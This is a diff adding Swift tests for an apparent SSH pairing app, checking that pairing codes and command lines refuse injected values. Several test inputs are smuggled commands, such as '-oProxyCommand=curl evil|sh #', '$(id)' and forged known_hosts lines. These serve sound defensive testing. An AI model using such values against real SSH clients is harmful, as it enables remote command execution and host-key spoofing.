@@ -53,6 +53,89 @@ struct ConnectionCheck {
             return (connection, states)
         }
 
+        // MARK: Pairing codes and command lines
+
+        func pairingCode(_ fields: [String: Any]) -> String {
+            let data = try! JSONSerialization.data(withJSONObject: fields)
+            return "rbr1:" + data.base64EncodedString()
+                .replacingOccurrences(of: "+", with: "-").replacingOccurrences(of: "/", with: "_")
+                .replacingOccurrences(of: "=", with: "")
+        }
+        let hostKey = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEBBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWltcXV5f"
+        let realAddresses = ["192.168.1.20", "100.101.102.103", "nas.tail1a2b3.ts.net", "fe80::1%en0",
+                             "[fd7a:115c:a1e0::53]", "nas.local"]
+        let real = try? PairingCode.parse("Paste this: " + pairingCode(
+            ["v": 1, "n": "nas", "u": "alex", "p": 2222, "o": "linux", "a": realAddresses, "k": [hostKey]]) + "\n")
+        check(real?.user == "alex" && real?.port == 2222 && real?.addresses == realAddresses && real?.hostKeys == [hostKey],
+              "a real pairing code is read, IPv6, tailnet and .local addresses included")
+        for user in ["CORP\\alex", "Alex Smith", "alex.smith_2"] {
+            let code = try? PairingCode.parse(pairingCode(["u": user, "a": ["10.0.0.2"], "k": [hostKey]]))
+            check(code?.user == user, "a pairing code for \(user) is read")
+        }
+        for user in ["-oProxyCommand=curl evil|sh #", "alex -oProxyCommand=x", "alex\nroot", "al;ex", "$(id)", "alex`id`", " alex"] {
+            let code = try? PairingCode.parse(pairingCode(["u": user, "a": ["10.0.0.2"], "k": [hostKey]]))
+            check(code == nil, "a pairing code for the user \(user.debugDescription) is refused")
+        }
+        let planted = try? PairingCode.parse(pairingCode(
+            ["u": "alex", "a": ["-oProxyCommand=touch /tmp/x", "10.0.0.2", "host name", "a\nb", "[::1", "x;y"], "k": [hostKey]]))
+        check(planted?.addresses == ["10.0.0.2"], "addresses that aren't host names or IPs are dropped (\(planted?.addresses ?? []))")
+        check((try? PairingCode.parse(pairingCode(["u": "alex", "a": ["-oProxyCommand=x"], "k": [hostKey]]))) == nil,
+              "a pairing code with no usable address is refused")
+        for port in [0, 70000, -22] {
+            check((try? PairingCode.parse(pairingCode(["u": "alex", "p": port, "a": ["10.0.0.2"], "k": [hostKey]]))) == nil,
+                  "a pairing code with port \(port) is refused")
+        }
+        let injectedKeys = try? PairingCode.parse(pairingCode(["u": "alex", "a": ["10.0.0.2"], "k": [
+            hostKey + "\n* ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEVJTA", "ssh-dss AAAAB3NzaC1kc3M", "ssh-rsa AAAAC3NzaC1lZDI1NTE5AAAAIEBB",
+            "ssh-ed25519 not*base64", hostKey + " comment",
+        ]]))
+        check(injectedKeys?.hostKeys == [hostKey],
+              "host keys that aren't one line of a known type and matching data are dropped (\(injectedKeys?.hostKeys ?? []))")
+        check((try? PairingCode.parse(pairingCode(["u": "alex", "a": ["10.0.0.2"], "k": [hostKey + "\n@cert-authority * x"]]))) == nil,
+              "a pairing code whose only host key is damaged is refused")
+
+        // Pinning checks the keys again, and clears out lines of any other
+        // shape that an earlier code may have slipped in.
+        let pinned = FileManager.default.temporaryDirectory.appendingPathComponent("rbr-known-hosts-\(getpid())")
+        try? "rbr-old \(hostKey)\n* \(hostKey)\nrbr-x ssh-ed25519 AAAA\n".write(to: pinned, atomically: true, encoding: .utf8)
+        var forged = real ?? PairingCode(name: "", user: "", port: 22, os: "", addresses: [], hostKeys: [])
+        forged.hostKeys = [hostKey, "ssh-ed25519 AAAA\n* ssh-rsa EVIL"]
+        try? forged.pinHostKeys(alias: "rbr-new", file: pinned)
+        let pinnedLines = ((try? String(contentsOf: pinned, encoding: .utf8)) ?? "").split(separator: "\n").map(String.init)
+        check(pinnedLines == ["rbr-old \(hostKey)", "rbr-new \(hostKey)"], "pinning writes only well-formed lines (\(pinnedLines))")
+        check((try? forged.pinHostKeys(alias: "*", file: pinned)) == nil, "and never under a pattern")
+        try? FileManager.default.removeItem(at: pinned)
+
+        // Every command line puts "--" right before the destination, so a
+        // destination is never read as an option.
+        let target = SSH.Target(destination: "alex@nas", port: 2222, hostKeyAlias: "rbr-1a2b3c4d")
+        let stream = SSH.background(target, auth: .appKey, avoidAgent: true) + ["stream"]
+        check(Array(stream.suffix(3)) == ["--", "alex@nas", "stream"], "the stream's command line ends -- alex@nas stream")
+        let setupLine = SSH.setupCommand(target, controlPath: "/tmp/rbr-test/x", command: ["uname", "-sm"])
+        check(Array(setupLine.suffix(4)) == ["--", "alex@nas", "uname", "-sm"] && setupLine.filter { $0 == "--" }.count == 1,
+              "a setup command's ends -- alex@nas uname -sm")
+        let sftpLine = SSH.sftpArguments(target, controlPath: "/tmp/rbr-test/x")
+        check(Array(sftpLine.suffix(2)) == ["--", "alex@nas"] && sftpLine.contains("-P") && !sftpLine.contains("-p"),
+              "sftp's ends -- alex@nas")
+        let argumentLog = FileManager.default.temporaryDirectory.appendingPathComponent("fake-ssh-args-\(getpid())")
+        try? FileManager.default.removeItem(at: argumentLog)
+        setenv("FAKE_SSH_LOG", argumentLog.path, 1)
+        setenv("FAKE_SSH_SCENARIO", "none", 1)
+        setenv("FAKE_SSH_COUNTER", argumentLog.path + ".count", 1)
+        var resolved = false
+        Task { _ = await SSH.resolve("-oProxyCommand=x"); resolved = true }
+        while !resolved { RunLoop.main.run(until: Date().addingTimeInterval(0.05)) }
+        SSH.closeMaster(target, controlPath: "/tmp/rbr-test/x")
+        unsetenv("FAKE_SSH_LOG")
+        let logged = ((try? String(contentsOf: argumentLog, encoding: .utf8)) ?? "").split(separator: "\n").map(String.init)
+        check(logged.count == 2 && logged[0].hasSuffix("-G -- -oProxyCommand=x") && logged[1].hasSuffix("-O exit -- alex@nas"),
+              "ssh -G and ssh -O exit put it after -- too (\(logged))")
+        try? FileManager.default.removeItem(at: argumentLog)
+        try? FileManager.default.removeItem(atPath: argumentLog.path + ".count")
+        check(!SSH.isUsableDestination("-oProxyCommand=x") && !SSH.isUsableDestination("alex@host name")
+              && SSH.isUsableDestination("alex@nas.local") && SSH.isUsableDestination("nas"),
+              "a typed destination that would read as an option, or has spaces, is refused")
+
         // A link that drops twice comes back on its own, with history kept.
         var (connection, states) = run("drop-then-recover", seconds: 20) { c, _ in
             c.state == .live && (c.snapshot?.cpu.total ?? 0) > 0 && c.history.cpu.count >= 6
